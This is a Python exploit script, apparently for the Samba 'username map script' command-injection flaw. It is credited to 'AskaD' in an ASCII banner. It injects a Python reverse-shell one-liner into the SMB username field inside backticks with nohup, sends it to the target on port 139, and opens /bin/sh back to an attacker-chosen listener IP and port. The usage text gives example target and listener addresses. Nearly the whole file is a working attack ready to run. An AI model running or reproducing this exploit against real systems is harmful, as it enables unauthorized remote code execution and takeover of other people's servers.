from smb.SMBConnection import SMBConnection
import platform
import os
import sys

class exploit():
	def __init__(self, raddr, port, addr):
		self.raddr = raddr
		self.port = port
		self.addr = addr

		self.launcher()
		self.run()

	def launcher(self):
		self.banner = """  ██████  ▄▄▄       ███▄ ▄███▓ ▄▄▄▄    ▄▄▄          █    ██   ██████ ▓█████  ██▀███   ███▄ ▄███▓ ▄▄▄       ██▓███  
▒██    ▒ ▒████▄    ▓██▒▀█▀ ██▒▓█████▄ ▒████▄        ██  ▓██▒▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒▒████▄    ▓██░  ██▒
░ ▓██▄   ▒██  ▀█▄  ▓██    ▓██░▒██▒ ▄██▒██  ▀█▄     ▓██  ▒██░░ ▓██▄   ▒███   ▓██ ░▄█ ▒▓██    ▓██░▒██  ▀█▄  ▓██░ ██▓▒
  ▒   ██▒░██▄▄▄▄██ ▒██    ▒██ ▒██░█▀  ░██▄▄▄▄██    ▓▓█  ░██░  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ░██▄▄▄▄██ ▒██▄█▓▒ ▒
▒██████▒▒ ▓█   ▓██▒▒██▒   ░██▒░▓█  ▀█▓ ▓█   ▓██▒   ▒▒█████▓ ▒██████▒▒░▒████▒░██▓ ▒██▒▒██▒   ░██▒ ▓█   ▓██▒▒██▒ ░  ░
▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░   ░  ░░▒▓███▀▒ ▒▒   ▓▒█░   ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░ ▒▒   ▓▒█░▒▓▒░ ░  ░
░ ░▒  ░ ░  ▒   ▒▒ ░░  ░      ░▒░▒   ░   ▒   ▒▒ ░   ░░▒░ ░ ░ ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░░  ░      ░  ▒   ▒▒ ░░▒ ░     
░  ░  ░    ░   ▒   ░      ░    ░    ░   ░   ▒       ░░░ ░ ░ ░  ░  ░     ░     ░░   ░ ░      ░     ░   ▒   ░░       
      ░        ░  ░       ░    ░            ░  ░      ░           ░     ░  ░   ░            ░         ░  ░         
                                    ░                                                                              

                   \033[31m{ By AskaD }\033[00m
              [=] \033[34mAuthor\033[00m  : AskaD    [=]
                 { \033[34mGithub\033[00m : 3x1t1um }"""
		if 'Windows' in platform.platform():
			os.system('cls')
		else:
			os.system('clear')

		print(self.banner)
		print()

	def run(self):
		payload = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+self.addr+"\","+str(self.port)+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

		login = "/=`nohup " + payload + "`"
		conn = SMBConnection(login, "", "" , "")
		try:
			conn.connect(self.raddr, 139, timeout=3)
		except:
			print('	-> Succes')

if __name__ == '__main__':
	if len(sys.argv) != 4:
		print('		Error argument')
		print()
		print('	#===============================================#')
		print('	 {} <rhost> <rport> <lhost>'.format(__file__))
		print('			 Exemple : ')
		print('	 {} 192.168.1.38 1337 192.168.1.14'.format(__file__))
		print()
		print('		   rhost = target ip')
		print('		   rport = port to listen')
		print('		   lhost = listen ip')
		print('	#===============================================#')
		sys.exit(1)

	exploit(sys.argv[1], sys.argv[2], sys.argv[3]) 
